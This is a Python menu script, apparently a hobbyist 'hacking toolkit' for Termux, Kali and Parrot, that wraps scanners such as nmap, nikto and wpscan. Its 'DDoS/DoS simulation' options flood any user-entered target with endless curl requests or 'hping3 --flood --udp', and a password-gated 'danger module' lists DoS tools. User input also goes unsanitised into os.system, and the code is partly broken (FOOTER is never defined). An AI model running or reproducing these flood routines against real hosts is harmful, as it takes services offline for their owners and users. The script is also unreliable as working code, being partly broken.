import os
import subprocess
import time

# Shared banner and footer templates
BANNER = """
 ░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓██████▓▒░  ░▒▓██████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░     
 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓█████████████▓▒░░▒▓████████▓▒░▒▓████████▓▒░  ░▒▓█▓▒░     
                                                                                                    
                                                                                  created by: crowley💀
"""

def clear_screen():
    os.system('clear')

def show_banner(title):
    clear_screen()
    print(BANNER.format(title=title))
    time.sleep(0.5)

def ask_continue_or_back():
    print("(1) Continue process")
    print("(2) Go back")
    return input("Enter choice: ") == "1"

def countdown_and_wait():
    for i in range(10, 0, -1):
        print(f"{i} seconds until start...")
        time.sleep(1)
    input("Press Enter to terminate the tool...")

# Secret module (🔒)
def secret_module():
    clear_screen()
    print("🔒" + "═" * 38 + "🔒")
    print("║         SECRET MODULE ACCESS         ║")
    print("🔒" + "═" * 38 + "🔒")
    pwd = input("Enter secret password: ")
    if pwd == "Termux":
        print("Acceso al módulo secreto: 5 herramientas OSINT👀")
        print("1) theHarvester 🕵️ (subdomain enumeration)")
        print("2) OSRFramework 👣 (OSINT framework)")
        print("3) Sherlock 🧠 (username lookup)")
        print("4) Maltego CE 🌐 (link analysis)")
        print("5) Shodan CLI 🔍 (IoT search)")
        input("Press Enter to return...")
    else:
        print("Password incorrect ⚠️")
        time.sleep(1)

# Danger module (☠️)
def danger_module():
    clear_screen()
    print("☠️" + "═" * 38 + "☠️")
    print("║           DANGER MODULE              ║")
    print("☠️" + "═" * 38 + "☠️")
    pwd = input("Enter danger password: ")
    if pwd == "Termux":
        print("Access granted to DANGER tools: 5 critical utilities")
        print("1) slowloris.py 🐌 (slow HTTP attack)")
        print("2) torshammer.py 🌐 (Tor‑based DDoS)")
        print("3) GoldenEye.py 🔥 (advanced HTTP DoS)")
        print("4) HTTPFlooder ⚡ (multi‑process flood)")
        print("5) UDPFlood 🌊 (custom UDP flood)")
        input("Press Enter to return...")
    else:
        print("Password incorrect ⚠️")
        time.sleep(1)

def install_packages():
    show_banner("INSTALLATION")
    print("Installing packages for Termux, Kali, Parrot...")
    # Termux
    subprocess.run("pkg update && pkg upgrade -y", shell=True)
    for pkg in ["sudo","nmap","aircrack-ng","python","python3-pip","git","curl","wget","vim","dirb","nikto"]:
        subprocess.run(f"pkg install {pkg} -y", shell=True)
    # Kali
    subprocess.run("apt update && apt upgrade -y", shell=True)
    for pkg in ["sudo","nmap","aircrack-ng","metasploit-framework","python3-pip","git","curl","wget","vim","gobuster","wpscan"]:
        subprocess.run(f"apt install {pkg} -y", shell=True)
    # Parrot
    subprocess.run("sudo apt update && sudo apt upgrade -y", shell=True)
    subprocess.run("sudo apt install sudo nmap aircrack-ng metasploit-framework python3-pip git curl wget vim feroxbuster dirb -y", shell=True)
    print("All packages installed.")
    input("Press Enter to return to menu...")

# TERMUX MENU
def termux_menu():
    show_banner("TERMUX")
    print("""\
║ (1)  Sniffer 🕵️‍♂️
║ (2)  Check web/IP status 🌐
║ (3)  HTTP requests 🔗
║ (4)  Secret 🔒
║ (5)  DDoS simulation ⚡
║ (6)  DoS simulation 🔥
║ (7)  Anti‑DDoS check 🛡️
║ (8)  Vulnerability scan 🕵️‍♀️
║ (9)  Port scan 🌍
║ (10) Show my IP 🌐
║ (11) Dirb directory scan 📁
║ (12) Nikto web scan 🕸️
║ (13) Danger ☠️
║ (14) Back ⇦""")
    print(FOOTER)
    choice = input("Select an option: ")

    if choice == "1" and ask_continue_or_back():
        print("Captura de paquetes de red")
        os.system("tcpdump -c 100")
    elif choice == "2" and ask_continue_or_back():
        print("Obtener código de estado HTTP de la web")
        url = input("Enter URL: ")
        os.system(f"curl -Is {url} | head -n1")
    elif choice == "3" and ask_continue_or_back():
        print("Enviar solicitudes HTTP simples")
        url = input("Enter URL: ")
        os.system(f"httpie {url}")
    elif choice == "4":
        if ask_continue_or_back():
            secret_module()
    elif choice == "5" and ask_continue_or_back():
        print("Simulación de ataque DDoS")
        target = input("Target URL/IP: "); bots = input("Number of bots (inf): ")
        if bots == "inf":
            countdown_and_wait()
            while True:
                os.system(f"curl {target} --silent > /dev/null")
        else:
            for _ in range(int(bots)):
                os.system(f"curl {target}")
    elif choice == "6" and ask_continue_or_back():
        print("Simulación de ataque DoS")
        target = input("Target IP: "); bots = input("Threads (inf): ")
        if bots == "inf":
            countdown_and_wait()
            while True:
                os.system(f"hping3 --flood --udp {target}")
        else:
            for _ in range(int(bots)):
                os.system(f"hping3 --flood --udp {target}")
    elif choice == "7" and ask_continue_or_back():
        print("Comprobación de protección anti‑DDoS")
        url = input("Enter URL: ")
        os.system(f"whatweb {url}")
    elif choice == "8" and ask_continue_or_back():
        print("Escaneo de vulnerabilidades con Nmap")
        target = input("Target IP/Domain: ")
        os.system(f"nmap --script vuln {target}")
    elif choice == "9" and ask_continue_or_back():
        print("Escaneo de todos los puertos con Nmap")
        target = input("Target IP/Domain: ")
        os.system(f"nmap -p- {target}")
    elif choice == "10" and ask_continue_or_back():
        print("Mostrar dirección IP pública")
        os.system("curl ifconfig.me")
    elif choice == "11" and ask_continue_or_back():
        print("Escaneo de directorios con Dirb")
        target = input("URL: ")
        os.system(f"dirb {target}")
    elif choice == "12" and ask_continue_or_back():
        print("Escaneo web con Nikto")
        target = input("URL: ")
        os.system(f"nikto -h {target}")
    elif choice == "13":
        if ask_continue_or_back():
            danger_module()
    time.sleep(1)

# KALI LINUX MENU
def kali_menu():
    show_banner("KALI LINUX")
    print("""\
║ (1)  Nmap 🔍
║ (2)  Metasploit ⚔️
║ (3)  DDoS simulation ⚡
║ (4)  DoS simulation 🔥
║ (5)  Aircrack-ng 📶
║ (6)  Hydra 🔐
║ (7)  TheHarvester 🕵️
║ (8)  Gobuster 🔎
║ (9)  Dirb 📁
║ (10) Wpscan 🛡️
║ (11) Scan IP 🌐
║ (12) Web status 🌐
║ (13) Anti‑DDoS check 🛡️
║ (14) Vuln scan 🕵️‍♂️
║ (15) Sniffer 👻
║ (16) HTTPS requests 🔗
║ (17) Danger ☠️
║ (18) Back ⇦""")
    print(FOOTER)
    choice = input("Select an option: ")
    if not ask_continue_or_back():
        return

    if choice == "1":
        print("Escaneo de red con Nmap")
        os.system("nmap -h")
    elif choice == "2":
        print("Iniciar Metasploit Framework")
        os.system("msfconsole")
    elif choice == "3":
        print("Simulación DDoS")
        target = input("Target URL/IP: "); bots = input("Bots (inf): ")
        if bots == "inf":
            countdown_and_wait()
            while True: os.system(f"curl {target}")
        else:
            for _ in range(int(bots)): os.system(f"curl {target}")
    elif choice == "4":
        print("Simulación DoS con hping3")
        target = input("Target IP: "); bots = input("Threads (inf): ")
        if bots == "inf":
            countdown_and_wait()
            while True: os.system(f"hping3 --flood --udp {target}")
        else:
            for _ in range(int(bots)): os.system(f"hping3 --flood --udp {target}")
    elif choice == "5":
        print("Aircrack-ng help")
        os.system("aircrack-ng --help")
    elif choice == "6":
        print("Hydra help")
        os.system("hydra -h")
    elif choice == "7":
        print("TheHarvester para OSINT")
        os.system("theHarvester -h")
    elif choice == "8":
        print("Directory brute force con Gobuster")
        target = input("URL: "); wordlist = input("Wordlist path: ")
        os.system(f"gobuster dir -u {target} -w {wordlist}")
    elif choice == "9":
        print("Escaneo de directorios con Dirb")
        target = input("URL: ")
        os.system(f"dirb {target}")
    elif choice == "10":
        print("Escáner WordPress con Wpscan")
        target = input("URL: ")
        os.system(f"wpscan --url {target}")
    elif choice == "11":
        print("Escaneo de IP con Nmap")
        ip = input("IP: "); os.system(f"nmap {ip}")
    elif choice == "12":
        print("Obtener estado HTTP de web")
        web = input("URL: "); os.system(f"curl -I {web}")
    elif choice == "13":
        print("Comprobación anti‑DDoS")
        web = input("URL: "); os.system(f"whatweb {web}")
    elif choice == "14":
        print("Escaneo de vulnerabilidades Nmap")
        dom = input("IP/domain: "); os.system(f"nmap --script vuln {dom}")
    elif choice == "15":
        print("Captura de paquetes con tcpdump")
        os.system("tcpdump -c 100")
    elif choice == "16":
        print("Peticiones HTTPS con HTTPie")
        url = input("URL: "); os.system(f"httpie {url}")
    elif choice == "17":
        if ask_continue_or_back():
            danger_module()
    time.sleep(1)

# PARROT OS MENU
def parrot_menu():
    show_banner("PARROT OS")
    print("""\
║ (1)  Nmap 🔍
║ (2)  Metasploit ⚔️
║ (3)  DDoS simulation ⚡
║ (4)  DoS simulation 🔥
║ (5)  Aircrack-ng 📶
║ (6)  Hydra 🔐
║ (7)  TheHarvester 🕵️
║ (8)  OSRFramework 👣
║ (9)  Sherlock 🧠
║ (10) Nikto 🕸️
║ (11) Exploit DB 🧨
║ (12) WAFW00F 🛡️
║ (13) Tor 👻
║ (14) SQLMap 🐍
║ (15) Sniffer 🕳️
║ (16) Feroxbuster 🚀
║ (17) HTTPie 🔗
║ (18) Danger ☠️
║ (19) Back ⇦""")
    print(FOOTER)
    choice = input("Select an option: ")
    if choice == "3" and ask_continue_or_back():
        print("Simulación DDoS")
        target = input("Target URL/IP: "); bots = input("Bots (inf): ")
        if bots == "inf":
            countdown_and_wait()
            while True: os.system(f"curl {target}")
        else:
            for _ in range(int(bots)): os.system(f"curl {target}")
    elif choice == "4" and ask_continue_or_back():
        print("Simulación DoS")
        target = input("Target IP: "); bots = input("Threads (inf): ")
        if bots == "inf":
            countdown_and_wait()
            while True: os.system(f"hping3 --flood --udp {target}")
        else:
            for _ in range(int(bots)): os.system(f"hping3 --flood --udp {target}")
    elif choice == "18":
        if ask_continue_or_back():
            danger_module()
    time.sleep(1)

# MAIN MENU
def main_menu():
    while True:
        show_banner("MAIN")
        print("""\
║ (1) Termux Menu
║ (2) Kali Linux Menu
║ (3) Parrot OS Menu
║ (4) Install Necessary Packages
║ (5) Exit""")
        print(FOOTER)
        choice = input("Select an option: ")
        if choice == "1":
            termux_menu()
        elif choice == "2":
            kali_menu()
        elif choice == "3":
            parrot_menu()
        elif choice == "4":
            install_packages()
        elif choice == "5":
            break
        else:
            print("Invalid option.")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
